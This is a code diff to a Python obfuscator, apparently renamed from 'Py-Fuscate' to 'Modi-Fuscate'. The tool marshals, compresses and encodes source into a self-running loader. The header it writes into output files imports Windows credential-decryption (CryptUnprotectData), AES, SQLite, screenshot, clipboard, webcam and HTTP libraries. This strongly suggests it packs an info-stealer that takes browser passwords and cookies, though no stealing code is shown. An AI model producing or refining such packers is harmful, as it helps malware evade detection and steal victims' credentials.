@@ -49,7 +49,7 @@ colorama.init(autoreset=True)
 
 def encode(source:str) -> str:
     selected_mode = random.choice((lzma, gzip, bz2, binascii, zlib))
-    marshal_encoded = marshal.dumps(compile(source, 'Py-Fuscate', 'exec'))
+    marshal_encoded = marshal.dumps(compile(source, 'Modi-Fuscate', 'exec'))
     if selected_mode is binascii:
         encoded = binascii.b2a_base64(marshal_encoded)
     else:
@@ -99,8 +99,6 @@ def parse_args():
 
 
 
-
-
 def main():
     args = parse_args()
     print(random.choice(COLORS) + '\t[+] encoding '.title() + args.input)
@@ -125,7 +123,7 @@ def main():
                     time.sleep(0.1)
                     pbar.update(1)
     with open(args.output, 'w') as output:
-        output.write(f"import asyncio, json, ntpath, os, random, re, shutil, sqlite3, win32api, locale, win32process, subprocess, threading, winreg, zipfile, httpx, psutil, win32gui, win32con, pyperclip, base64, requests, ctypes, time;from sqlite3 import connect;from base64 import b64decode;from urllib.request import Request, urlopen;from shutil import copy2;from datetime import datetime, timedelta, timezone;from sys import argv;from tempfile import gettempdir, mkdtemp;from json import loads, dumps;from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer;from Crypto.Cipher import AES;from PIL import ImageGrab;from win32crypt import CryptUnprotectData;from subprocess import CREATE_NEW_CONSOLE, Popen\n\ntry:\n\t{encoded}\nexcept KeyboardInterrupt:\n\tpass")
+        output.write(f"import asyncio, sys, json, os, random, re, shutil, sqlite3, subprocess, threading, winreg, zipfile, httpx, psutil, base64, requests, ctypes, time, pyperclip, locale, win32gui, win32con, win32api, win32process, cv2; from tempfile import gettempdir, mkdtemp; from sqlite3 import connect; from base64 import b64decode; from urllib.request import Request, urlopen; from datetime import datetime, timedelta, timezone; from sys import argv; from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer; from Crypto.Cipher import AES; from win32crypt import CryptUnprotectData; from subprocess import CREATE_NEW_CONSOLE, Popen; from PIL import ImageGrab\n\ntry:\n\t{encoded}\nexcept KeyboardInterrupt:\n\tpass")
     print(LIGRE + '\t[+] encoding successful!\n\tsaved as '.title() + args.output)
 if __name__ == '__main__':
     logo()
